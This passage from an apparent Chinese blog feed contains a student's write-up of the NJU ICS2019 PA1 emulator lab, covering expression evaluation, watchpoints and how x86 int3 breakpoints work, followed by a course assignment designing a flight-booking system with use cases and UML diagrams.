-</span>  <span class="hljs-comment">// level 3: &amp;&amp;</span>  <span class="hljs-comment">// level 4: ||</span>  <span class="hljs-comment">// level 5: == !=</span>  <span class="hljs-type">int</span> levels[<span class="hljs-number">6</span>] = {<span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>};  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = p; i &lt; q; i++)  {    <span class="hljs-keyword">if</span> (tokens[i].type == <span class="hljs-string">'('</span>)    {      bracket_cnt++;    }    <span class="hljs-keyword">if</span> (tokens[i].type == <span class="hljs-string">')'</span>)    {      bracket_cnt--;    }    <span class="hljs-keyword">if</span> (bracket_cnt == <span class="hljs-number">0</span>)    {      <span class="hljs-keyword">switch</span> (tokens[i].type)      {      <span class="hljs-keyword">case</span> TK_DEREF:      <span class="hljs-keyword">case</span> TK_NEG:      <span class="hljs-keyword">case</span> TK_NOT:        <span class="hljs-keyword">if</span> (levels[<span class="hljs-number">0</span>] == <span class="hljs-number">-1</span>)        {          levels[<span class="hljs-number">0</span>] = i;        }        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> <span class="hljs-string">'*'</span>:      <span class="hljs-keyword">case</span> <span class="hljs-string">'/'</span>:        levels[<span class="hljs-number">1</span>] = i;        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> <span class="hljs-string">'+'</span>:      <span class="hljs-keyword">case</span> <span class="hljs-string">'-'</span>:        levels[<span class="hljs-number">2</span>] = i;        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> TK_AND:        levels[<span class="hljs-number">3</span>] = i;        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> TK_OR:        levels[<span class="hljs-number">4</span>] = i;        <span class="hljs-keyword">break</span>;      <span class="hljs-keyword">case</span> TK_EQ:      <span class="hljs-keyword">case</span> TK_NEQ:        levels[<span class="hljs-number">5</span>] = i;        <span class="hljs-keyword">break</span>;      }    }  }</code></pre></div></div><p>一个坑是注意到讲义中提到<strong>出现在一对括号中的token不是主运算符</strong>，因此一定要确保只对括号外的运算符判断优先级即可。优先级参照C++的优先级表分成了六个等级，依次扫描即可。</p><p>接下来for循环遍历的过程自然地返回了存在的最高优先级运算符的位置。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-s0whbylluxp18z"></i><span>c++</span><div class="collapse show" id="collapse-s0whbylluxp18z"><pre><code class="hljs c++">  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)  {    <span class="hljs-keyword">if</span> (levels[i] != <span class="hljs-number">-1</span>)    {      <span class="hljs-keyword">return</span> levels[i];    }  }  <span class="hljs-comment">// if no operator found</span>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"error:no operator found in get_domin_op_pos\n"</span>);  <span class="hljs-built_in">panic</span>(<span class="hljs-string">"p=%d,q=%d in get_domin_op_pos() where got no token"</span>, p, q);}</code></pre></div></div><p>当然最后需要在<code>ui.c</code>加入表达式求值的指令。</p><p>实现效果：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205845305075_505_20230322090903021377_849_image-20230321194541159.png" alt="image-20230321194541159"><figcaption aria-hidden="true">image-20230321194541159</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205846416684_863_20230322090904623223_231_image-20230321194853335.png" alt="image-20230321194853335"><figcaption aria-hidden="true">image-20230321194853335</figcaption></figure><h4 id="感想">感想</h4><p>在表达式求值的实验中确实感受到了基本调试工具和手段的重要性。首先gcc开启<code>--Wall</code>和<code>-Werror</code>能够杜绝绝大多数“手误”(第一次完整实现完表达式求值的时候错误爆满屏..)，同时不同位置的<code>assert</code>也便于查看问题出现的位置。</p><h2 id="pa1.3">PA1.3</h2><h3 id="监视点">监视点</h3><h4 id="任务-4">任务</h4><p>这一部分相比前两部分要简单很多。主要是链表的基本操作，操作系统，编译原理中也经过多次练习。主要是需要考虑清楚清楚是“头插法”还是“尾插法”。</p><p>先在nemu/include/monitor/watchpoint.h中完成对结构体的补充和函数的定义。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yeiv3dlluxp18z"></i><span>c++</span><div class="collapse show" id="collapse-yeiv3dlluxp18z"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">watchpoint</span>{  <span class="hljs-type">int</span> NO;  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">watchpoint</span> *next;  <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Add more members if necessary */</span>  <span class="hljs-type">char</span> expr[<span class="hljs-number">32</span>];  <span class="hljs-type">uint32_t</span> value;} WP;</code></pre></div></div><p>当我们需要打印断点信息的时候需要知道表达式和具体值。</p><p>添加监视点需要从free链表中取一个结点给head链表，且将表达式、节点值赋给它，最后返回该节点的编号。删除监视点是遍历head链表直到找出对应NO的结点，从head中删除，添加到free链表中。同时修改类型、表达式、值。代码参见<code>nemu/src/monitor/debug/watchpoint.c</code>，不再赘述。</p><h4 id="问题-1">问题</h4><p>下面的问题的答案都主要来自于讲义中提供的文章，这篇文章比较深入的介绍了x86int3指令的工作方式。</p><h6 id="一点也不能长">一点也不能长?</h6><p>我们知道 int3 指令不带任何操作数,操作码为 1 个字节,因此指令的长度是 1个字节.这是必须的吗?假设有 一种 x86 体系结构的变种 my-x86,除了 int3指令的长度变成了 2 个字节之外,其余指令和 x86 相同.在 my-x86中,文章中的断点机制还可以正常工作吗?为什么?</p><blockquote><p>Intel Mannual 原文中提到：</p><blockquote><p>This one byte form is valuable because it can be used to replace thefirst byte of any instruction with a breakpoint, including other onebyte instructions, without over-writing other code</p></blockquote><p>第二个问题的答案是不能。</p><p>文章中还给出了这个例子：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tfrjv6lluxp18z"></i><span>assembly</span><div class="collapse show" id="collapse-tfrjv6lluxp18z"><pre><code class="hljs assembly">   .. some code ..   jz    foo   dec   eax&gt;foo:   call  bar   .. some code ..</code></pre></div></div><p>假设我们想在dec-eax上放置一个断点。这恰好是一条单字节指令（操作码为0x48）。如果替换断点指令的长度超过1字节，将被迫覆盖下一条指令（调用）的一部分，这将使其混乱，并可能产生完全无效的内容。并且我们不确定<code>jz foo</code>会不会跳转。在不停止dec-eax的情况下，CPU将直接执行其后的无效指令。</p><p>由于1字节是x86上指令能得到的最短字节，我们保证只有我们想要中断的指令才会被更改。</p></blockquote><h6 id="随心所欲的断点">随心所欲"的断点</h6><p>在x86中由于是使用int3中断触发的断点，如果在x86架构gdb中将断点设置在指令的非首字节（中间或末尾），根据gdb的工作原理，会将目标地址的第一个字节替换为int3指令，然后触发断点后再换回去，将被跟踪进程的指令指针回滚一位。(这也就是指导书中说的“偷龙转凤”)因此，这时候回滚的位置可能并不符合预期。事实上gdb在这种情况下也会报错。</p><h6 id="nemu的前世今生">NEMU的前世今生</h6><p>NEMU是通过监视点来模拟断点的，而gdbz正如上文所示是通过创建<code>ptrace</code>进程命中操作系统的<code>int3</code>中断完成的。</p><h2 id="i386手册">I386手册</h2><h6 id="尝试通过目录定位关注的问题">尝试通过目录定位关注的问题</h6><p>假设你现在需要了解一个叫 selector 的概念,请通过 i386手册的目录确定你需要阅读手册中的哪些地方.</p><p>可以通过搜索解决问题。关于selector的详细阐述在内存管理部分，</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205847482942_898_image-20230321211615894.png" alt="image-20230321211615894"><figcaption aria-hidden="true">image-20230321211615894</figcaption></figure><p>点进去就可以看到段选择子的格式。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205849258235_907_image-20230321211811752.png" alt="image-20230321211811752"><figcaption aria-hidden="true">image-20230321211811752</figcaption></figure><h2 id="必答题">必答题</h2><p>一、</p><p>1、EFLAGS 寄存器中的 CF 位是什么意思?</p><p>CF是进位标志，在最高位发生进位或借位后将CF位置1，否则置0。</p><p>2、ModR/M 字节是什么?</p><p>ModR/M由Mod，Reg/Opcode，R/M三部分组成。Mod是前两位，用来寄存器寻址和内存寻址;Reg/Opcode是中间三位，Reg代表使用的寄存器，Opcode则是对group的Opcode进行补充;R/M为最后三位，与Mod结合起来可以得到8个寄存器和24个内存寻址。</p><p>3、mov 指令的具体格式是怎么样的? 格式是DEST ← SRC。</p><p>二、</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5yb9oglluxp18z"></i><span>shell</span><div class="collapse show" id="collapse-5yb9oglluxp18z"><pre><code class="hljs shell">find . -name "*[.h/.c]" | xargs wc -l</code></pre></div></div><p>利用正则表达式，可以如下方式获取非空行代码行数</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-arioe2lluxp18z"></i><span>shell</span><div class="collapse show" id="collapse-arioe2lluxp18z"><pre><code class="hljs shell">find . -name "*[.h/.c]" | xargs grep "^." | wc -l</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205850634028_644_20230322090905518782_851_image-20230321202840329.png" alt="image-20230321202840329"><figcaption aria-hidden="true">image-20230321202840329</figcaption></figure><p><code>git checkout</code>到原来的状态后结果如下：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205851869518_327_20230322090906611356_503_image-20230321204938932.png" alt="image-20230321204938932"><figcaption aria-hidden="true">image-20230321204938932</figcaption></figure><p>可以看到这次PA总共写了523行代码。</p><p>三、</p><p>-Wall打开所有警告，使用GCC进行编译后产生尽可能多的警告信息，取消编译操作，打印编译时所有错误或警告信息。</p><p>-Werror 要求GCC将所有的警告当成错误进行处理，取消编译操作。</p><p>使用-Wall和-Werror就是为了找出所有存在的警告，从而尽可能地避免程序运行出错。</p><p>这次实验的很多错误的发现都有这个的帮助。不过有时候gcc的检查也会显得过于严格。比如下面<code>eval</code>函数虽然已经包含了所有分支的处理，但最后还是要求我们return一个值。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205853446704_485_20230322090907728645_363_image-20230321205535450.png" alt="image-20230321205535450"><figcaption aria-hidden="true">image-20230321205535450</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件工程-软件设计作业</title>
    <link href="/posts/48981/"/>
    <url>/posts/48981/</url>
    
    <content type="html"><![CDATA[<h1 id="机票预订系统软件设计">机票预订系统软件设计</h1><p>2013599 田佳业</p><h2 id="系统概述">系统概述</h2><p>参考现实中机票预订系统的设计，结合实际本系统设计与题目所述有所优化：将付款放在预订机票环节而非取票环节，因为若预订机票后再付款，容易导致恶意抢占预订名额的现象，而付款后再占据预订名额能够增加成本，尽可能的避免这种情况发生。</p><h2 id="用例图">用例图</h2><p>下面通过用例图从总体上描述描述机票预订系统的功能性需求。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210425289726_730_20230409235255868737_526_image-20230408230603393.png" alt="image-20230408230603393"> | <font color="green">登录</font> | |------------------------------- | | <strong>用例ID：</strong> 1 | |<strong>参与者：</strong> 旅客，工作人员 | | <strong>简要说明：</strong>用户登录航班预订系统 | | <strong>前置条件：</strong> 无 | |<strong>基本事件流：</strong><br>1.用户进入主界面点击“登录/注册”按钮<br>2.进入登录界面，用户填写登录信息(用户名，手机号，密码)<br>3.系统校验登录信息成功，用户登录成功| |<strong>其他事件流：</strong><br>1.用户进入主界面点击“登录/注册”按钮，跳转至登录界面<br>2.进入登录界面，用户填写登录信息(用户名，手机号，密码)<br>3.系统未检索到该手机号，提示用户进行注册，进入注册页面| |<strong>异常事件流：</strong><br>1.用户信息填写格式不正确-&gt;前端校验，给予提示<br>2.用户名或密码与手机号不匹配，提示用户重新进行输入<br>3.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面| | <strong>后置条件：</strong>登录成功，返回首页供用户选择其他操作 | |注释：实际生活中手机号唯一，往往登录和注册的功能进行合并，可减小用户操作成本。|</p><table><thead><tr class="header"><th><font color="green">注册</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 2</td></tr><tr class="even"><td><strong>参与者：</strong> 未注册旅客，未注册工作人员</td></tr><tr class="odd"><td><strong>简要说明：</strong> 未注册用户进入注册页面进行注册</td></tr><tr class="even"><td><strong>前置条件：</strong> 用户手机号未注册</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1.用户由登录界面跳转至注册界面<br>2.出现注册页面，默认用户名为登录时输入用户名，手机号为登录时输入手机号。用户完善个人信息。<br>3.系统发送手机验证码，用户填写验证码，校验正确后完成注册</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.用户信息填写格式不正确-&gt;前端校验，给予提示<br>2.用户手机号已被注册-&gt;提示进入登录页面<br>3.用户验证码不正确-&gt;提示用户重新填写<br>3.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件：</strong>注册成功，系统添加完成用户信息，登录当前新注册账号</td></tr><tr class="odd"><td>注释：从登录部分拓展</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">查询航班信息</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 3</td></tr><tr class="even"><td><strong>参与者：</strong> 旅客，工作人员</td></tr><tr class="odd"><td><strong>简要说明：</strong> 用户进入航班查询页面进行航班查询</td></tr><tr class="even"><td><strong>前置条件：</strong> 无</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1用户点击搜索框搜索航班<br>2.系统获取用户查询条件，执行查询，并进入新的页面展示查询结果</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>1..用户点击查看当前航班页面<br>2。系统获取24小时内起飞的所有航班信息，进入新的页面展示查询结果</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.未输入查询条件-&gt;前端提示用户输入查询条件<br>2.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：无</td></tr><tr class="odd"><td>注释：航班信息管理包含查询航班信息，且查询航班信息不需要用户登录</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">预订机票</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 4</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客进行机票预订</td></tr><tr class="even"><td><strong>前置条件：</strong> 已登录并选择了希望预订的航班</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1用户点击座位充裕的航班<br>2.选择座位等次和位置，提交预订机票请求<br>3.预订机票成功，提示用户进行付款<br>4.用户支付机票金额，系统生成取票凭据及账单，并提示用户及时查看已订机票信息并打印取票凭据。</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.用户选择航班时未登录-&gt;跳转至登录页面提示用户登录或注册<br>2.提交请求时由于优先级低，被其他旅客预订-&gt;提示机票已被预订，让旅客重新选择<br>3.预订机票后15分钟内未付款-&gt;系统收回用户预订机票<br>4.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：用户拥有在线机票，该航班信息更新</td></tr><tr class="odd"><td>注释：系统并不强制旅客必须在预订机票后查询已订机票，尽管系统建议旅客时查看已订机票信息并打印取票凭据。</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">查询已订机票</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 5</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客进行已订机票的查看</td></tr><tr class="even"><td><strong>前置条件：</strong> 已登录</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1用户点击“我”-&gt;已订机票<br>2.系统根据用户ID查询该用户已订购机票，并返回机票信息</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：用户得知已订购机票，在该页面进行后续操作，如获取取票凭据，退票等</td></tr><tr class="odd"><td>注释：系统并不强制旅客必须在预订机票后查询已订机票，尽管系统建议旅客时查看已订机票信息并打印取票凭据。</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">退票</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 6</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客在查询页面选择进行退票</td></tr><tr class="even"><td><strong>前置条件：</strong> 已登录</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1用户在查询已订机票页面点击退票<br>2.系统提示用户确认后，取消用户航班。</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>1.若用户已取票，更新票据状态为无效<br>2.若用户已付款，退回已付金额</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：用户已订机票信息和航班信息更新，该用户航班取消。</td></tr><tr class="odd"><td>注释：无</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">获取取票凭据</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 7</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客保存或打印取票凭据</td></tr><tr class="even"><td><strong>前置条件：</strong> 已预订成功机票</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1用户保存取票凭据页面选择保存电子版凭据或打印纸质版凭据<br>2.系统生成凭据二维码或打印取票通知</td></tr><tr class="even"><td><strong>其他事件流：</strong>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面<br>2.无法打印-&gt;提示用户保存电子版凭据或等待</td></tr><tr class="even"><td><strong>后置条件</strong>：用户获得取票凭据</td></tr><tr class="odd"><td>注释：获取取票凭据为起飞前取票做准备</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">取票</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 8</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客凭取票凭据取票</td></tr><tr class="even"><td><strong>前置条件：</strong> 旅客已获得取票凭据</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1.用户输入个人信息(如手机号和验证码)，系统进行身份校验<br>2.系统读取用户电子版或纸质凭据，并进行校验<br>3.校验通过，打印票据给旅客</td></tr><tr class="even"><td><strong>其他事件流：</strong>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.系统校验失败(如身份校验不通过，用户票据无效等)-&gt;根据情况提示用户错误信息<br>2.无法打印-&gt;提示用户等待，并向管理员报告错误<br>3.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：用户获得机票，准备乘机</td></tr><tr class="odd"><td>注释：即使取票依赖取票凭据，但取票并不与获取取票凭据有包含或拓展的关系，因为取票并不是获取取票凭据的特殊化，因此不是拓展关系；并不是取票时必须调用获取凭据操作，因此不是包含关系。</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">个人信息管理</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 9</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客，已注册管理员</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客和管理员个人信息管理</td></tr><tr class="even"><td><strong>前置条件：</strong> 旅客或管理员已注册</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1.用户点击个人信息管理按钮，系统校验用户名和密码以及验证码<br>2.修改个人信息，并进行保存</td></tr><tr class="even"><td><strong>其他事件流：</strong>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.系统校验失败(如身份校验不通过，用户票据无效等)-&gt;根据情况提示用户错误信息<br>2.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：用户个人信息发生改变</td></tr><tr class="odd"><td>注释：无</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">航班信息管理</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 10</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册管理员</td></tr><tr class="odd"><td><strong>简要说明：</strong>管理员进行航班信息的管理，如增加航班，修改航班信息等</td></tr><tr class="even"><td>**前置条件：管理员已登录</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>管理员进入航班信息管理页面，进行航班信息的操作，如增加航班，修改航班信息等</td></tr><tr class="even"><td><strong>其他事件流：</strong>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：航班信息被修改</td></tr><tr class="odd"><td>注释：航班信息管理包含查询航班信息，因为管理航班信息必定要先查看。同时在用例图中不分解出CURD操作，会造成冗余</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">账单管理</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 11</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册管理员</td></tr><tr class="odd"><td><strong>简要说明：</strong>管理员对账单进行手动管理，如调整旅客已订航班等</td></tr><tr class="even"><td><strong>前置条件</strong>：管理员已登录</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1.管理员输入旅客ID(可通过旅客信息管理获取)，查看旅客账单信息<br>2.视情况对该旅客的账单进行调整</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>管理员根据筛选条件对符合条件的账单进行批量调整</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：管理员查看到账单信息，可能对其有修改</td></tr><tr class="odd"><td>注释：该功能主要针对系统出现异常或应对航班出现的特殊情况，增加手动管理旅客账单的功能。</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">旅客信息管理</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 12</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册管理员</td></tr><tr class="odd"><td><strong>简要说明：</strong>管理员进行旅客个人信息的查看，修改等</td></tr><tr class="even"><td><strong>前置条件：</strong> 管理员已登录</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1.管理员根据筛选条件(如旅客姓名，航班信息等)，查询旅客信息<br>2.视情况对旅客信息进行调整</td></tr><tr class="even"><td><strong>其他事件流：</strong>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：管理员查看到旅客信息，可能对其有修改</td></tr><tr class="odd"><td>注释：针对旅客个人信息的管理模块，该部分不应包含旅客账单相关内容</td></tr></tbody></table><h2 id="活动图">活动图</h2><p>活动图中的每个圆角矩形中为动作状态，描述原子性的行为。登录和注册部分的用例较为复杂，在这里用活动图来较为详细的描述登录和注册的流程。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210426308912_650_20230409235259075956_784_image-20230409202727243.png" alt="image-20230409202727243" width="150%" height="150%"></p><p>用户未登录或注册完成时，随时可以点击取消结束该用例流程。用户进入登录页面，输入用户名，手机号，密码。系统会查找该用户的手机号是否已完成注册。若用户未注册，系统会自动为用户进行注册，提示用户输入个人信息，通过验证码验证手机号可用后即可完成注册。由于注册时用户有可能改变手机号信息，因此注册阶段也需要验证手机号。确定用户使用手机号注册后系统生成手机验证码，并提示用户输入。用户正确输入验证码后系统接受注册信息，存储新用户信息并自动登录，前端通知用户并结束用例流程，供用户选择后续操作。</p><h2 id="类图">类图</h2><p>类图是系统的概念基础。下面将整个订票系统涉及的实体和控制类通过类图描述。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210427690596_694_20230409235301223716_963_image-20230409231700319.png" alt="image-20230409231700319" width="150%" height="150%"></p><p>类图部分事实上是在整个设计过程中考虑和修改次数最多的部分。</p><p>由于管理员课执行操作较多，不同管理员除了权限等级差距外执行的具体操作并无差距，我们可以将管理员可以执行的操作提取为静态的方法类。实体类及其方法均需与用例描述对应。</p><p>考虑到类图整体的简洁，图中省略了方法参数。</p><h2 id="顺序图">顺序图</h2><p>顺序图能够体现类与类之间的交互关系。最重要的是，顺序图能够实现某个功能的必要步骤。因此下面分别在细粒度和粗粒度上给出个人信息管理和旅客乘机全过程的顺序图。</p><p>前面已经给出了注册登录部分的活动图，在下面的图示中默认提及到的用户均已登录。</p><h3 id="个人信息管理">个人信息管理</h3><p>下面展示了用户个人信息管理的顺序图。</p><p>用户可查看个人信息，修改个人信息是可选的。同时用户选择结束个人信息管理时前端页面关闭，处理该事务的DAO关闭，数据库需要持续运行。这个过程中所有的消息都是同步消息。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210430070649_951_20230409235303100664_328_image-20230409203220770.png" alt="image-20230409203220770"><figcaption aria-hidden="true">image-20230409203220770</figcaption></figure><blockquote><p>→查询个人信息请求(用户→系统前端)</p><p>→提交查询请求(系统前端→DAO)</p><p>→根据用户ID查询用户信息(DAO→DB)</p><p>→返回用户信息(DB→DAO)</p><p>→传送用户信息(DAO→系统前端)</p><p>→展示用户信息(系统前端→用户）</p><p>→选择需修改的信息(用户→系统前端）</p><p>→判断修改的信息，提交修改请求(系统前端→DAO)</p><p>→执行修改信息计划(DAO→DB)</p><p>→返回执行状态(DB→DAO)</p><p>→ 判断是否修改成功，传送修改状态(DAO→系统前端)</p><p>→展示修改状态(系统前端→用户）</p><p>→结束个人信息管理(用户→系统前端)</p><p>→销毁当前DAO(系统前端→DAO)</p></blockquote><h3 id="旅客乘机全过程">旅客乘机全过程</h3><p>旅客乘机包含查询航班信息，预订机票，查看已订机票，获取取票凭据，取票几个阶段。为清晰的表示各阶段之间的关系，不再表示出具体前后端交互的过程，转而强调各个类之间的关系。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210431213370_167_20230409235304935117_188_image-20230409214542211.png" alt="image-20230409214542211" width="150%" height="150%"></p><blockquote><p>查询航班信息(旅客→Flights类）</p><p>→返回航班信息(ight类&gt;旅客)</p><p>→ 订票请求(旅客→Bi类）</p><p>→根据用户所选FlightlD获取用户所选机票价格(Bill类→Flight类)</p><p>→ 返回航班价格(Flight类→Bill类)</p><p>→生成账单(Bill类→Bill类)</p><p>→ 要求用户付款(Bill类&gt;旅客)</p><p>→[15分钟内]付款(旅客→Bill类）</p><p>→[opt]销毁账单(Bill类→Bill类)</p><p>→返回预订成功信息(Bl类→旅客)</p><p>→ 获取取票凭据(旅客→CredentialGenerator类）</p><p>→ 根据用户所选航班获取账单(CredentialGeneratora类→Bill类)</p><p>→ 返回账单ID(Bill类→CredentialGenerator类)</p><p>→要求用户选择凭据类型(CredentialGenerator类→旅客)</p><p>→用户选择凭据类型(旅客→CredentialGenerator类）</p><p>→ 生成凭据(CredentialGenerator类→CredentialGenerator类)</p><p>→返回凭据给用户(CredentialGenerator类→旅客)</p><p>→取票(旅客→TicketGenerator类）</p><p>→ 